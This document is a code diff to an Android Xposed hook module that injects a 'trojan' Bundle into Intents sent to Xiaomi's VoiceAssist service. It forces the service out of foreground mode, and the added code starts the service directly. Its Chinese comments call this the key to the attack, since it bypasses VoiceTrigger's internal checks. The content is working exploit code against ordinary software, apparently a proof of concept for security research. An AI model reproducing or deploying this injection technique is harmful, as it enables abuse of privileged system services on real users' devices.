@@ -84,6 +84,8 @@ class HookVoiceTrigger(ixp: XposedInterface): HookBase(ixp) {
     class StartServiceHook : XposedInterface.Hooker {
         companion object {
 
+            private const val TAG = "StartServiceHook"
+            
             val messages = ConcurrentLinkedQueue<Bundle>()
 
             @JvmStatic
@@ -92,16 +94,29 @@ class HookVoiceTrigger(ixp: XposedInterface): HookBase(ixp) {
                 val hook = StartServiceHook()
 
                 val intent = (callback.args[1] as Intent).clone() as Intent
+                
+                Log.d(TAG, "startService called with action: ${intent.action}")
+                
                 if (intent.action != Constants.ACTION_START_VOICEASSIST) return hook
 
-                val message = messages.poll() ?: return hook
+                val message = messages.poll() ?: run {
+                    Log.d(TAG, "No trojan message in queue, this is a normal startService call")
+                    return hook
+                }
+                
+                Log.i(TAG, "Injecting trojan message into Intent: $message")
 
                 // no foreground
                 val index = (callback.member as Method).parameterTypes.indexOf(Boolean::class.java)
-                callback.args[index] = false
+                if (index != -1) {
+                    callback.args[index] = false
+                    Log.d(TAG, "Set foreground flag to false")
+                }
 
                 intent.putExtra(Constants.HACKER_KEY, message)
                 callback.args[1] = intent
+                
+                Log.i(TAG, "Trojan Intent injected successfully")
 
                 return hook
             }
@@ -123,8 +138,25 @@ class HookVoiceTrigger(ixp: XposedInterface): HookBase(ixp) {
 
             if (input.dataPosition() != input.dataCapacity()) {
                 input.readBundle(javaClass.classLoader)?.let { trojan ->
-                    Log.i(TAG, "Trojan message: $trojan")
+                    Log.i(TAG, "Trojan message detected: $trojan")
                     StartServiceHook.messages.offer(trojan)
+                    
+                    // 手动触发 startService 来启动 VoiceAssist
+                    // 这是攻击的关键：绕过 VoiceTrigger 的内部检查，直接启动服务
+                    try {
+                        Log.i(TAG, "Manually triggering VoiceAssist service...")
+                        val context = xyz.mufanc.vap.util.Ctx.app
+                        val intent = android.content.Intent(Constants.ACTION_START_VOICEASSIST)
+                        intent.setPackage("com.miui.voiceassist")
+                        intent.setClassName("com.miui.voiceassist", "com.xiaomi.voiceassistant.VoiceService")
+                        
+                        // 使用 startService 启动服务
+                        // 这会触发 StartServiceHook，将恶意 Bundle 注入到 Intent 中
+                        context.startService(intent)
+                        Log.i(TAG, "VoiceAssist service triggered successfully")
+                    } catch (e: Throwable) {
+                        Log.e(TAG, "Failed to trigger VoiceAssist service", e)
+                    }
                 }
             }
 
